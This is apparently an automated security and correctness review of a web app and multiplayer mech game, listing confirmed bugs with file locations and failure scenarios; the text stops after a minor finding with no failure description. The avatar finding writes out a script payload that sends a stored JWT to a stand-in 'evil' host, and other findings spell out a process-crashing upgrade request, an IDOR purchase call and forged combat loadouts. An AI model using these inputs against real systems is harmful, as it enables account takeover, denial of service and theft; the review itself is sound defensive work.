# seethbotsite — Fable Code Review

_Full-repo review: 8 Fable finders → dedup → 3-verifier adversarial panels (2-of-3 to survive). Ran 2026-07-07 on branch `mech-grinder-overhaul`._

## Executive summary

64 raw findings → 63 after dedup → **43 confirmed** by adversarial verification (**5 critical, 21 major, 17 minor**). ~20 refuted. The run exhausted Fable credits before verifying the **infra/deploy dimension** and a handful of others — those are listed unverified at the end (raw finder claims, neither confirmed nor refuted).

The pre-GRINDER site (backend + main frontend) carries the bulk and severity of the debt: several **process-crash / DoS** paths from missing async error handling, **broken access control**, **stored-XSS**, and whole **frontend features that are silently non-functional** (Messages, Stats) from an API-client method-name mismatch that no typecheck catches. The mech game is comparatively healthy but has one **critical rendering bug** (below) plus economy/flow edge cases.


## 🔴 CRITICAL

### backend/src/controllers/multiplayer.controller.ts:27  ·  correctness  ·  (3/3, backend-api)
**Malformed upgrade-request URL throws inside the 'upgrade' event handler, crashing the whole process (no uncaughtException handler exists)**

_Failure:_ Any unauthenticated client sends a raw request 'GET //[a HTTP/1.1' with 'Connection: Upgrade' + 'Upgrade: websocket' headers. Node emits 'upgrade', the handler synchronously executes new URL('//[a', 'http://host') which throws TypeError: Invalid URL (verified with node -e on this box: it throws). The throw propagates out of the EventEmitter, and since grep confirms there is no process.on('uncaughtException') anywhere in src/, the Node 20 process exits — killing the whole site (index.ts) or the mech server (mech-server.ts). The identical pattern exists in presence.controller.ts line 105, so both registered upgrade listeners are crash vectors.

### backend/src/services/reaction.service.ts:53  ·  correctness  ·  (3/3, backend-api)
**Reacting with a second, different emoji to the same target violates the Prisma unique constraint (which omits emoji) and the resulting unhandled rejection crashes the server**

_Failure:_ User reacts 👍 to message 5 (row created). User then reacts ❤️ to the same message: toggleReaction's findFirst includes emoji:'❤️' so it finds nothing and calls prisma.reaction.create — but schema.prisma:459 declares `@@unique([user_id, target_type, target_id])` WITHOUT emoji, so the create throws P2002. The calling route handler (reactions.controller.ts:84-119) has zero try/catch, Express is 4.18 (no async error forwarding, no express-async-errors installed), so the rejection is unhandled and Node 20 terminates the process. A single user clicking two different emoji reactions kills the entire backend.

### backend/src/controllers/reactions.controller.ts:112  ·  correctness  ·  (3/3, backend-api)
**All six reactions handlers lack try/catch, so any Prisma error (including the documented integer targetId) is an unhandled rejection that crashes the process**

_Failure:_ POST /api/reactions with body {targetType:'message', targetId:123, emoji:'👍'} — exactly what the route's own OpenAPI doc specifies ('targetId: type: integer, example: 123') — reaches `toggleReaction(userId, targetType, targetId, emoji)` with a number, but Prisma's Reaction.target_id is String (schema.prisma:453), so findFirst rejects with PrismaClientValidationError. No try/catch in the handler + Express 4 + Node 20 => unhandled rejection => process exit. Any transient DB error on any reactions route has the same effect. (favorites.controller.ts:89-97 GET '/' and profiles.controller.ts GET/PUT/PATCH handlers share this unwrapped-async pattern.)

### apps/mech/frontend/src/lib/battle/MechEntity.ts:253  ·  correctness  ·  (3/3, mech-game)
**Async model-load swap replaces mech.mesh after the scene already added the old group, so every mech's rendered body is orphaned (frozen at spawn) and dead enemies leak ghost meshes**

_Failure:_ Any mech spawn (story player, story enemies, arena duel/survival): the constructor builds a procedural mesh, the caller synchronously does scene.add(mech.mesh) (StoryCombat.ts:549, StoryWorld.ts:342, BattleScene.ts:505/556), then loadAndApplyModels() resolves (assembleMech NEVER rejects — MechModelLoader.loadPartModel catches all errors and falls back to procedural parts) and rebinds this.mesh to a new group that is never added to the scene. From then on update() moves/animates the detached group while the old, geometry-disposed group stays in the scene frozen at the spawn transform; on kill, scene.remove(e.mech.mesh) removes the wrong (detached) group so the ghost mesh is never removed from the scene. Reproduced with a vitest run: after waitForModelLoad(), mech.mesh identity changed and scene.children.includes(mech.mesh) === false while the old mesh remained in the scene.

### docker-compose.yml:26  ·  data-integrity  ·  (3/3, data-integrity)
**Uploaded avatars are stored on the container's ephemeral filesystem (no volume), so every deploy permanently deletes all user avatars while their DB URLs persist**

_Failure:_ User uploads an avatar; POST succeeds, Postgres stores avatar_url='/avatars/<hash>.png', file lands in /app/backend/public/avatars inside the container layer. The next `./deploy.sh` rebuilds the image and recreates the container, wiping the directory. Every profile now renders a broken image (express.static at index.ts:130 serves from the same empty dir), and the files are unrecoverable — the postgres-backup service only dumps the DB.


## 🟠 MAJOR

### backend/src/controllers/reactions.controller.ts:183  ·  correctness  ·  (3/3, backend-api)
**POST /api/reactions/force never awaits addReaction: the 409 duplicate path is dead code, the response returns an empty object, and duplicates crash the process**

_Failure:_ Client calls POST /api/reactions/force. `const reaction = addReaction(...)` is a Promise (always truthy) so the `if (!reaction) return 409` branch can never execute; the client receives `{success:true, reaction: {}}` (a Promise serializes to {}). Worse, the service's own guard is broken too: reaction.service.ts:74-86 does `try { return prisma.reaction.create(...) } catch { return null }` WITHOUT await, so the promised rejection escapes the try/catch — on a duplicate reaction the create rejects with P2002 after the response was already sent, producing an unhandled rejection that terminates the Node 20 process.

### backend/src/controllers/reactions.controller.ts:239  ·  correctness  ·  (3/3, backend-api)
**DELETE /api/reactions/:id never awaits removeReactionById, so it always responds 200 'Reaction removed' even when the reaction doesn't exist or belongs to another user**

_Failure:_ User A calls DELETE /api/reactions/999999 (nonexistent) or DELETE on user B's reaction id. `const success = removeReactionById(reactionId, userId)` is an unawaited Promise, which is always truthy, so the `if (!success) return 404` branch is dead and the API returns `{success:true, message:'Reaction removed'}` in every case. Clients (and their UI state) believe a deletion happened that did not. If the underlying promise rejects (DB error), it is also an unhandled rejection.

### backend/src/services/profile.service.ts:93  ·  data-integrity  ·  (3/3, backend-api)
**social_links is JSON.stringified twice (controller + service) and re-stringified on every PATCH, progressively corrupting stored profile data**

_Failure:_ PUT /api/profiles/me with social_links:{twitter:'x'} — profiles.controller.ts:283 stringifies it to '{"twitter":"x"}', then upsertProfile line 93 stringifies AGAIN, storing '"{\"twitter\":\"x\"}"'. GET /api/profiles/me parses one level and returns social_links as the STRING '{"twitter":"x"}' instead of the object the client saved. It compounds: PATCH /api/profiles/me (even just changing bio) goes through updateProfile, which merges the already-stored string into upsertProfile where it is stringified yet another level — every PATCH adds one more layer of escaping, so the field degrades further on each profile edit.

### backend/src/services/GameServer.ts:275  ·  race-condition  ·  (3/3, backend-api)
**Reconnecting (or opening a second tab) makes the old socket's async 'close' event deregister the NEW connection, leaving the player a zombie and forfeiting any active match**

_Failure:_ A player refreshes the page mid-match. registerPlayer sees the existing (still-open) old socket, calls existing.socket.close(), and stores the new record in this.players. Milliseconds later the old socket's 'close' event fires and multiplayer.controller.ts:94-97 calls gameServer.handleDisconnect(userId), which looks up only by playerId — it finds the NEW record, forfeits the player's match via match.handleDisconnect, removes them from the matchmaking queue, and deletes the new entry from this.players. Every subsequent message on the fresh websocket is silently dropped because handleMessage line 317-318 does `const player = this.players.get(playerId); if (!player) return;`.

### backend/src/services/MatchInstance.ts:200  ·  resource-leak  ·  (3/3, backend-api)
**The countdown interval is never stored or cleared, so a disconnect during countdown leaves an orphaned match that later starts a 20Hz game loop running forever**

_Failure:_ PvP match found; during the 3s countdown one player closes the tab. handleDisconnect's COUNTDOWN branch (lines 892-910) calls this.cleanup() (tickInterval is still null — nothing to clear) and onMatchEndCallback, so GameServer deletes the match from this.matches and clears both players' currentMatchId. But the local `countdownInterval` created in start() keeps ticking; when it reaches 0 it sets matchState='ACTIVE' and calls startGameLoop(), spawning a setInterval at 20Hz on a match no one references. Nothing can ever call cleanup() on it again (GameServer forgot it), so it burns CPU and streams state_snapshot messages to the remaining player's socket for that cancelled match indefinitely — one leaked loop per countdown-cancelled match.

### backend/src/services/GameServer.ts:369  ·  security  ·  (3/3, backend-api)
**The client-supplied loadout from match_request is used as the authoritative combat config — damage, cooldown, and energyCost are attacker-controlled**

_Failure:_ A modified client sends match_request with loadout.rightWeapon = {type:'railgun', damage: 999999, cooldown: 0, energyCost: 0, ...}. handleMatchRequest performs no validation and queues it verbatim; MatchInstance.handleWeaponFire then spawns projectiles with `weaponConfig.damage` (MatchInstance.ts:1112-1118) and MechEntity.canFireWeapon/fireWeapon honor the client's cooldown/energyCost (MechEntity.ts:63-91). The cheater one-shots every opponent and fires every tick, in a server that is explicitly meant to be authoritative ('authoritative server tick loop'). Also nothing checks the loadout even exists or is object-shaped.

### backend/src/services/MatchInstance.ts:835  ·  correctness  ·  (3/3, backend-api)
**PlayerInput fields are never type/range-validated: non-numeric or NaN values permanently corrupt the authoritative match state, and a NaN timestamp bypasses the input-age check**

_Failure:_ A malicious client sends {type:'input', seq:1, timestamp:'x', input:{forward:true, aimDirection:{x:{},y:0,z:0}}}. Age check: `Math.abs(this.serverTime - 'x')` is NaN, and `NaN > NETWORK.MAX_INPUT_AGE` is false, so the stale-input rejection never fires. Then updatePlayerPhysics computes `Math.atan2(input.aimDirection.x, ...)` = NaN, making velocity/position NaN; the Math.max/Math.min clamps at lines 547-549 preserve NaN, so the player's authoritative position becomes NaN forever and is serialized into every state_snapshot (JSON.stringify turns NaN into null), breaking the opponent's game. Similarly a zero-length aimDirection {x:0,y:0,z:0} while shooting divides by zero in ProjectileSystem.spawnProjectile (length 0 at line 49-57) producing NaN projectile velocity.

### backend/src/services/MatchInstance.ts:847  ·  correctness  ·  (3/3, backend-api)
**In survival co-op a destroyed (0-health) player keeps moving and firing normally — death has no gameplay effect until the run ends**

_Failure:_ Two players in survival co-op; player A's health reaches 0 (mech_destroyed is broadcast via handleSurvivalProjectileHit/handleEnvironmentKill, but the run continues because resolveSurvivalState requires ALL humans dead). Nothing marks A as dead: handleInput has no health check, updatePlayerPhysics runs for every human regardless of health, and MechEntity.canFireWeapon only checks cooldown/power — so the 'destroyed' player keeps walking and shooting AI mechs at full effectiveness with 0 HP for the rest of the run, contradicting the mech_destroyed event the clients just rendered. Relatedly, dead AI mechs stay in aiMechs until the whole wave is cleared, keep absorbing projectiles in checkCollisions, and takeDamage returns true on every hit to a corpse (health already 0), re-broadcasting duplicate mech_destroyed events per hit.

### backend/src/services/profile.service.ts:139  ·  security  ·  (3/3, security)
**Avatar upload derives the stored file extension from the client-supplied filename, allowing an authenticated user to save a same-origin .html/.svg file that executes as stored XSS and steals JWTs from localStorage.**

_Failure:_ Attacker POSTs multipart to /api/profiles/avatar with header Content-Type: image/png (passes the multer fileFilter and the ALLOWED_AVATAR_TYPES check) but filename="x.html" and a body of `<script>fetch('//evil/'+localStorage.getItem('seethbot-auth-token'))</script>`. The file is written as e.g. public/avatars/5-<hex>.html and served by `app.use('/avatars', express.static(...))` (index.ts:130) with Content-Type text/html. The site CSP is `script-src 'self' 'unsafe-inline'`, so opening /avatars/5-<hex>.html runs the inline script on the app origin. Since the auth JWT is kept in localStorage under 'seethbot-auth-token' (frontend/stores/useAuthStore.ts:61,562), luring any logged-in user to the link yields their token and full account takeover.

### backend/src/controllers/auth.controller.ts:24  ·  security  ·  (3/3, security)
**The strict per-15-minute auth rate limiter shares one in-memory store with the global 60s/10000 limiter, so its window collapses to ~60s and login/register brute-force protection is silently ~7x weaker (and can lock legit logins out under game traffic).**

_Failure:_ A login request increments the shared entry twice (once per limiter). Because the global limiter recreates the entry every 60 seconds with resetTime=now+60s, the auth counter is reset every ~60s instead of every 15 minutes, giving an attacker roughly 10 password attempts per 60s per IP (~14k/day) versus the intended 20 per 15 minutes (~1.9k/day). Conversely, during normal high-volume /api game traffic from an IP the shared count reaches 20 quickly, causing legitimate /auth/login requests from that IP to be 429-blocked.

### backend/src/controllers/shop.controller.ts:278  ·  security  ·  (2/3, security)
**POST /api/shop/purchase (and /inventory) take userId from the request with no authentication, so anyone can spend another user's points and create purchases on the victim's account (broken access control / IDOR).**

_Failure:_ An unauthenticated attacker sends POST /api/shop/purchase {"userId": <victimId>, "itemId": <expensiveItem>}. The server deducts the victim's points balance and inserts a PurchasedItem row for the victim, permanently marking the item owned (the unique user_id_item_id constraint blocks the victim from ever buying it themselves). GET /api/shop/inventory?userId=<victimId> likewise discloses any user's purchases without auth.

### apps/mech/frontend/src/components/pages/StoryModePage.vue:629  ·  state-machine  ·  (3/3, mech-game)
**finaleAnnounced is initialized true for an exploring run and never reset, so Vaun's Act III withdrawal-order dialogue (the obey/refuse decision) never fires when the finale unlocks during an uninterrupted session**

_Failure:_ Fresh run, play continuously: beginRoaming() sets finaleAnnounced = (phase !== 'finale') = true while exploring. When the 3rd town reaches standing 100, useStoryMode.refreshPhase() flips run.phase to 'finale' mid-session. handleFinale() then hits `if (!finaleAnnounced)` — already true — and permanently skips the block that plays the cue and opens vaunSanctionTree, so the campaign's central obey/refuse choice (setFlags obeyed-withdrawal/refused-order, commandRep +10 / -25, townRep +20 — the flags the tribunal verdict copy reads, and the only push-button path to concludeRun()) is silently never delivered. It only appears if the player happens to save & exit and Continue mid-finale (beginRoaming then sets finaleAnnounced=false and the order fires — proving the intended behavior), or if they dismount and manually open a comms post (dialogueForAnchor('comms', act3)).

### apps/mech/frontend/src/lib/battle/MultiplayerBattleScene.ts:572  ·  correctness  ·  (2/3, multiplayer)
**Local player is driven by GRINDER PhysicsSystem constants but overwritten each snapshot by ClientPrediction/server old-model physics, causing constant rubber-banding**

_Failure:_ A player holds W in any multiplayer/survival match. Between snapshots update() moves playerMech via this.physicsSystem.updateMovement/updateJumpJets (MultiplayerBattleScene.ts:572-577), which uses the grinder constants in lib/battle/constants.ts: baseSpeed = BASE_SPEED_FACTOR(8) * speedStat(<=1) * weightFactor(<=1) => a top ground speed of ~8 u/s, JUMP_VELOCITY_BASE 20, JUMP.GRAVITY 50. But handleStateSnapshot (line 209-217) calls clientPrediction.reconcile() then sets playerMech.position = predictedState.position 20x/sec, and ClientPrediction.applyInput (ClientPrediction.ts:136) integrates with the entirely different shared GameConstants the server also uses: MECH.MOVE_SPEED 40, MECH.JUMP_THRUST 40, PHYSICS.GRAVITY -30. Server and prediction agree (both old model), so reconcile is stable and the mech snaps to a 40 u/s / high-arc trajectory every 50 ms while grinder physics only crawled ~0.4 u in between. Result: the local mech lurches ~1.6 u forward and jumps to a taller arc on every snapshot -- visible rubber-banding/teleporting on all movement and jumps. The grinder movement rewrite is effectively dead and mismatched against the netcode.

### backend/src/services/MatchInstance.ts:499  ·  correctness  ·  (3/3, multiplayer)
**Server never processes the dash input, so client-predicted dashes always rubber-band back**

_Failure:_ A player taps dash. Client predicts a dash: ClientPrediction.applyInput sets isDashing=true and applies MECH.DASH_SPEED_MULTIPLIER (2.5x) to velocity, and PhysicsSystem.updateDash launches the local mech. The input.dash flag is sent to the server, but MatchInstance.handleInput/updatePlayerPhysics never set state.isDashing to true anywhere -- it is only read at updatePlayerPhysics line 499 (`const dashMultiplier = state.isDashing ? MECH.DASH_SPEED_MULTIPLIER : 1;`) and initialized false at line 1051. So the authoritative mech never dashes. The predicted position diverges from the server by more than the 0.5u threshold, reconcile resets to the (non-dashed) server position, and on input replay the client re-applies the dash, staying permanently diverged. Net effect: dashing produces a burst that is yanked back every snapshot; the ability does nothing server-authoritatively.

### backend/src/services/MatchInstance.ts:880  ·  correctness  ·  (2/3, multiplayer)
**Any transient WebSocket close instantly force-forfeits a PvP match; RECONNECT_GRACE_PERIOD is defined but never used and reconnection cannot rejoin**

_Failure:_ A player's connection blips for a moment during an ACTIVE PvP match. The ws 'close' handler (multiplayer.controller.ts:94-97) calls gameServer.handleDisconnect immediately, which calls match.handleDisconnect -> endMatch(opponent, 'disconnect') at MatchInstance.ts:880-891 with no grace window, ending the match and awarding the opponent the win within 2s. NetworkManager.attemptReconnect then reconnects with the same token, but registerPlayer creates a fresh player record with currentMatchId=null (GameServer.ts:279-284) and the match is already gone -- so the player cannot rejoin. The MATCHMAKING.RECONNECT_GRACE_PERIOD (10000ms) constant exists but is never referenced by disconnect handling, so a 1-second network hiccup is an instant loss.

### frontend/repositories/messages.repository.ts:16  ·  correctness  ·  (3/3, main-site)
**Messages feature is completely non-functional: repository calls axios-style lowercase methods on an openapi-fetch client that only exposes uppercase GET/POST/PUT/DELETE**

_Failure:_ Any authenticated user opens /messages (linked from the quick-nav bar and Community dropdown). MessagesPage.vue:24 calls messagesRepository.getConversations() -> apiClient.get(...) -> TypeError: apiClient.get is not a function -> caught and rendered as 'Failed to load conversations'. Every operation (list/create conversation, get/send/edit/delete message, mark read) fails the same way, so the entire Messages feature is dead. Unit tests pass only because tests/repositories/messages.repository.test.ts mocks the client with lowercase get/post/put/delete.

### frontend/repositories/stats.repository.ts:86  ·  correctness  ·  (3/3, main-site)
**All game-stat API calls (record stat, high score, leaderboard, user/global stats, history) throw TypeError for the same lowercase-method reason, so stats are silently never recorded and StatsPage shows nothing**

_Failure:_ User plays Clicker or Fishing: useClickerGame.ts:221 / useFishingGame.ts:312 / ClickerPage.vue:255 call statsRepository.recordStat -> apiClient.post(...) -> TypeError: apiClient.post is not a function, caught and logged, so clicks/catches/high scores are never persisted (ClickerPage even re-queues the value forever). User opens /stats: getLeaderboard/getUserStats/getGlobalStats/getStatsHistory all throw the same way, so leaderboards and stats are permanently empty.

### frontend/stores/useAuthStore.ts:200  ·  auth  ·  (3/3, main-site)
**Token 'refresh' never rotates the JWT: refreshToken() only GETs /auth/me, never calls the backend's POST /api/auth/refresh, so every user is hard-logged-out 30 days after login despite the rolling-session design**

_Failure:_ User logs in on day 0 and uses the site regularly. Each /auth/me extends the DB session's expires_at by 30 days (backend/src/users.ts:177-192), and startTokenRefresh() keeps scheduling refreshes 30s before that ever-receding expiry — so the frontend logs 'Token refreshed successfully' while the bearer JWT itself was signed with expiresIn '30d' (backend/src/users.ts:9,285) and is never replaced (setAuth is only called from login/register). Exactly 30 days after login jwt.verify() fails in validateTokenAndGetUser, every API call returns 401, and fetchAndApplySession clears auth — forced re-login for an active user. The backend endpoint that would fix this (POST /api/auth/refresh, auth.controller.ts:239, returns a rotated token) has zero frontend callers.

### frontend/components/shared/ui/SearchModal.vue:76  ·  broken-route  ·  (3/3, main-site)
**The 'Profile' entry in the global search modal navigates to /profile, but no /profile route exists — users land on the 404 page while a full ProfilePage.vue sits orphaned**

_Failure:_ User opens the search modal (wired into MainApp.vue via appStore.toggleSearchModal and a keyboard shortcut), types or scrolls to 'Profile', selects it -> router.push('/profile') -> matches only the catch-all `/:pathMatch(.*)*` -> NotFoundPage renders. Same for ProfileCard.vue:63-65 which pushes '/profile' and '/profile/${id}'. frontend/components/pages/ProfilePage.vue exists (285 lines, fetches /api/profile/{id}) but is registered in no route, so it is unreachable dead code.

### backend/src/controllers/characters.controller.ts:195  ·  data-integrity  ·  (3/3, data-integrity)
**Character vote endpoint half-completes on every vote: ELO updates commit, then the CharacterMatch insert always fails a FK violation because voter_id defaults to 0**

_Failure:_ Any user votes on the Character Tinder page: the two character.update calls commit (ratings change), then characterMatch.create throws P2003 (voter_id=0 violates the FK), the catch returns 500 `{error: 'Failed to process vote'}`. Match history is never recorded for any vote, the client shows an error and stores the error object as `lastVote`, and a retry applies the ELO change a second time — ratings drift with no audit trail.

### backend/src/stockMarket.ts:285  ·  data-integrity  ·  (2/3, data-integrity)
**buyShares/sellShares perform two independent non-transactional writes whose failures are swallowed, so the endpoint reports success while the portfolio and the stock share pool permanently diverge**

_Failure:_ A buy of 100 shares hits a transient DB error during savePortfolio: the API returns success:true with the new cash figure, saveStock still persists `stock.shares -= 100` — 100 shares are now permanently removed from the market pool while the user's DB portfolio kept its cash and no holdings. Separately, two concurrent buys by the same user each read cash=10000, each pass the `totalCost > portfolio.cash` check, and the last savePortfolio write wins — one transaction's holdings/transactions records are silently overwritten.


## 🟡 MINOR

### backend/src/services/MatchInstance.ts:1254  ·  correctness  ·  (3/3, backend-api)
**In survival co-op, all AI kills and damage are credited to player1's stats regardless of who fired**

_Failure:_ Two-player survival match; player2 lands every shot on an AI mech. handleSurvivalProjectileHit resolves the attacker via projectileOwnerId, which unconditionally returns this.player1.playerId whenever the hit target is an AI. Player1's stats.shotsHit/damageDealt accumulate all of player2's damage, and every damage/mech_destroyed event names player1 as the attacker — the end-of-run stats each player receives are wrong.

### backend/src/mech-server.ts:37  ·  resource-leak  ·  (3/3, backend-api)
**WebSocket upgrade requests to unknown paths are never rejected on the mech server, leaving TCP sockets open indefinitely**

_Failure:_ A client (or scanner) opens ws://mech-host:3011/anything. The only 'upgrade' listener (multiplayer.controller.ts:28-30) returns early for non-multiplayer paths with the comment 'Let other handlers deal with it', but on mech-server.ts there is no other handler and — unlike index.ts which sets server.setTimeout(30000) — mech-server never sets a socket timeout, so the half-upgraded socket is neither answered nor destroyed and stays open until the client gives up. Repeated connections accumulate open FDs.

### backend/src/controllers/presence.controller.ts:117  ·  security  ·  (3/3, security)
**The presence WebSocket performs no authentication and no Origin check — identity (userId/userName/avatar) is taken from unauthenticated query params, allowing arbitrary user impersonation and cross-site WebSocket hijacking.**

_Failure:_ Anyone (or any malicious web page via a cross-origin `new WebSocket('wss://site/ws?userId=<victim>&userName=<victim>')`, since there is no origin check) can connect as any user, broadcasting user_joined/user_left as that victim and reading the presence roster of any page, enabling spoofing and presence tampering.

### backend/src/controllers/multiplayer.controller.ts:50  ·  security  ·  (3/3, security)
**The multiplayer WebSocket verifies the JWT signature only and never checks the sessions table, so logout, 'log out all devices', and password change (which delete DB sessions) do not revoke live game access until the 30-day JWT naturally expires.**

_Failure:_ A user logs out (logoutUser deletes the session row) or changes their password (changeUserPassword calls deleteAllSessions, users.ts:427). A copy of the still-unexpired JWT (valid up to JWT_EXPIRY default '30d', users.ts:9) continues to authenticate new /ws/mech/multiplayer connections because no session record is consulted, so a leaked/stolen token cannot be revoked for multiplayer for up to 30 days.

### apps/mech/frontend/src/lib/battle/EnemyAI.ts:571  ·  combat-logic  ·  (3/3, mech-game)
**Hard-coded 30-unit fire gate is shorter than the sniper archetype's 34-unit optimal range, so snipers regulate themselves to a distance from which they mostly cannot fire**

_Failure:_ Any story wave/extraction/boss composition containing 'sniper' (compositionForDifficulty medium/hard/boss, extractionPressComposition, convoy boss tier): the kite state machine retreats when distance < optimalRange - rangeDiscipline (34-10 = 24) and chases when > 44, holding the sniper in the 24-44u band and steering it toward ~34u (flank closingBias is negative below optimalRange). The fire decision then requires `distanceToPlayer < 30`, so at its own regulated range the "extreme-range shot-leader" holds fire; it only shoots in the narrow 24-30u slice, making the archetype read as a passive wanderer instead of the ranged threat it is documented to be.

### apps/mech/frontend/src/composables/useStoryMode.ts:1518  ·  economy  ·  (3/3, mech-game)
**buyAndEquip silently destroys the displaced loadout part instead of returning it to the inventory, contradicting the swap invariant the parallel install path enforces**

_Failure:_ Player has legs-bipedal-standard equipped and uses the Garage's Buy & Fit to buy legs-quad: buyAndEquip builds `candidate = { ...loadout, [slot]: part }` and assigns it, so the old legs part vanishes from the run entirely — no inventory entry, no trade-in refund. Had the player instead bought the part via a salvage-drop install (installFromInventory), the displaced part would have been stowed pristine (sellable for 40% of shop price via sellPart). Every shop upgrade over an occupied slot therefore destroys owned, sellable property; e.g. upgrading a ~400-scrap part silently burns the ~160 scrap it would fetch.

### apps/mech/frontend/src/lib/battle/BattleScene.ts:575  ·  correctness  ·  (3/3, mech-render)
**handleVisibilityChange restarts the rAF loop after the battle has already ended, re-firing onBattleEnd and double-counting survival score**

_Failure:_ In survival mode, after the wave-clear `onBattleEnd('victory')` fires, update() calls this.stop() but BattleCanvas stays mounted (endBattle keeps phase 'active' and betweenWaves stages nextWave via a 1500ms setTimeout). If the user hides and re-shows the tab inside that ~1.5s window, handleVisibilityChange sees animationId === null and calls animate() again; update() re-enters the battleEnding branch with battleEndTimer already <= 0 and calls this.onBattleEnd('victory') a second time -> useMechBattle.endBattle runs again and `battleState.value.score += waveScore` double-counts the wave score (repeats on every hide/show until respawnEnemy resets battleEnding).

### apps/mech/frontend/src/lib/battle/ParticleSystem.ts:519  ·  performance  ·  (3/3, mech-render)
**Per-particle Vector3 clone allocation in the per-frame update loop (up to 1500 allocations per frame during heavy VFX)**

_Failure:_ During dense VFX (explosions + smoke screens + spark sprays fill the pool toward MAX_PARTICLES = 1500), ParticleSystem.update() allocates a new THREE.Vector3 per live particle per frame via `p.velocity.clone().multiplyScalar(deltaTime)` — ~90,000 short-lived allocations/second at 60fps — creating avoidable GC pressure and frame-time spikes exactly when the scene is busiest. `p.position.addScaledVector(p.velocity, deltaTime)` is allocation-free. The same clone-per-entity-per-frame pattern is in ProjectileSystem.update (ProjectileSystem.ts:458 `proj.position.add(proj.velocity.clone().multiplyScalar(deltaTime))` plus two `velocity.clone().normalize()` quaternion aims per missile/ballistic projectile per frame).

### backend/src/game/ProjectileSystem.ts:49  ·  data-integrity  ·  (3/3, multiplayer)
**spawnProjectile normalizes the fire direction without a zero/finite guard, so a malformed or zero aimDirection produces NaN projectile state broadcast to all clients**

_Failure:_ A hostile (or buggy) client sends an input with aimDirection {x:0,y:0,z:0} (or non-numeric values). handleWeaponFire passes it straight to ProjectileSystem.spawnProjectile, where length = sqrt(0) = 0 and normalizedDir = [0/0,...] = [NaN,NaN,NaN], giving a NaN velocity. update() then makes projectile.position NaN; the ground check `position[1] < 0` is false for NaN so it never despawns early, and getProjectileStates() broadcasts the NaN projectile to BOTH players every snapshot for the full 5s lifetime, corrupting opponent projectile rendering. Input direction is never validated or sanitized on the server.

### backend/src/services/MatchInstance.ts:1088  ·  correctness  ·  (3/3, multiplayer)
**hasPlayer() dereferences this.player2.playerId with no null check; player2 is legitimately null in solo survival**

_Failure:_ In a solo survival match this.player2 is null (constructor line 159). If hasPlayer(id) is called for such a match with an id that is not player1, `this.player2.playerId` throws TypeError: Cannot read properties of null. Confirmed still present at HEAD; getPlayer/getOpponent guard player2 but hasPlayer does not. Currently latent because no production code path calls hasPlayer (only tests), which is why it is minor rather than a live crash.

### backend/src/services/GameServer.ts:273  ·  correctness  ·  (3/3, multiplayer)
**registerPlayer's duplicate-connection handling deletes the NEW session instead of the old one when a second live socket connects**

_Failure:_ A second connection opens for the same userId while the first socket is still OPEN (double-login / same token opened twice). registerPlayer closes existing.socket (line 275-277) and immediately overwrites players.get(playerId) with the new record whose currentMatchId is null (line 279-284). The old socket's close event then fires asynchronously and calls handleDisconnect(playerId), which now resolves to the NEW record and deletes it from the players map (GameServer.ts:310). The new socket stays open but is unregistered, so every subsequent message from it is dropped by handleMessage's `if (!player) return` (line 317-318) -- the reconnecting client becomes a zombie.

### frontend/features/mech/routes.ts:5  ·  correctness  ·  (3/3, main-site)
**The /mech handoff is broken in dev: the proxied mech index.html loads /src/main.ts from the wrong (main-site) dev server and the mech dev router has no /mech/* base, so clicking 'Mech Game' during development yields a broken page**

_Failure:_ Developer runs dev.sh (main site :3000, mech app :3002) and clicks 'Mech Game' in the nav. handoffToMechApp does window.location.assign('/mech/builder'); the main Vite server proxies /mech -> :3002 (frontend/vite.config.ts:41, no path rewrite), which returns the mech index.html referencing `/src/main.ts` un-prefixed. The browser fetches /src/main.ts from the MAIN dev server, which has no src/main.ts and SPA-fallbacks its own index.html as text/html -> module MIME error, blank page. Even if assets loaded, apps/mech/frontend/vite.config.ts sets base '/' in dev (`base: isProd ? '/mech/' : '/'`), so the mech router cannot match /mech/builder. The sibling tickets feature avoids this with an import.meta.env.DEV branch (features/tickets/routes.ts:18); mech has none.

### frontend/composables/useRouteAuth.ts:25  ·  dead-code  ·  (3/3, main-site)
**useRouteAuth is dead code that misleads: no router guard is ever installed, so its 'protected routes' (/settings, /messages, /favorites) are not guarded, ?returnTo= is never honored anywhere (including the mech app's auth handoff), and router meta.public flags have zero readers**

_Failure:_ A developer reading useRouteAuth.ts or the `meta: { public: true }` annotations in router/index.ts concludes routes are auth-guarded and that /auth?returnTo=/settings redirects back after login. Neither is true: grep shows no `router.beforeEach`/`handleAuthRedirect` caller in app code (main.ts installs no guard), and AuthPage.vue reads only route.query.mode — after login it just switches to profile mode (AuthPage.vue:88), so the mech app's AuthRedirectPage handoff to /auth?mode=login strands the player on the main site's auth page with no way back to /mech.

### frontend/src/client/api-client.ts:21  ·  dead-code  ·  (3/3, main-site)
**Dead API client whose 'request interceptor' assigns apiClient.FETCH — a property openapi-fetch never reads — so the documented window.__API_BASE_URL__/VITE_API_BASE_URL override is a no-op (and would throw if it ever ran)**

_Failure:_ A deploy that sets VITE_API_BASE_URL (as .env.development does: http://localhost:3001) or injects window.__API_BASE_URL__ expects typed-client requests to target that origin. They never do: `const originalFetch = apiClient.FETCH` captures undefined (verified: the client's keys are request/GET/PUT/.../use/eject; correct extension points are the `fetch` option or `use` middleware), the assigned function is never invoked by the library, and if invoked manually it would throw calling undefined originalFetch. The file additionally has zero importers (all repositories use frontend/utils/apiClient.ts), so it only misleads.

### frontend/utils/apiClient.ts:7  ·  type-safety  ·  (3/3, main-site)
**The live typed API client imports its `paths` types from a nonexistent module ('../types/openapi' -> frontend/types/openapi.ts does not exist), and tsconfig.typecheck.json never checks it (its include list even still names the deleted components/mech/MapPreview3D.vue) — this absent type safety is what let the Messages/Stats method-name bugs ship**

_Failure:_ Anyone adding utils/apiClient.ts (or any repository) to the typecheck include set gets an immediate TS2307 'Cannot find module ../types/openapi' — the generated types actually live at frontend/src/types/openapi.ts (used correctly by the dead src/client/api-client.ts). Until then, `createClient<paths>` and every repository call are compiled by esbuild with types stripped and never validated, so calls like apiClient.get()/post() (findings 1-2) pass CI. The stale include entry 'components/mech/MapPreview3D.vue' (deleted in the mech-tree removal) is silently ignored by tsc, shrinking effective coverage further.

### frontend/tests/components/ApiDocsPage.test.ts:29  ·  test-coverage  ·  (3/3, main-site)
**Unit test suite is red: ApiDocsPage.test.ts fails to even transform (top-level `await` inside a non-async it()), and useQuote/CountdownPage tests assert stale behavior — 3 files / 4 tests fail on every `npm test`**

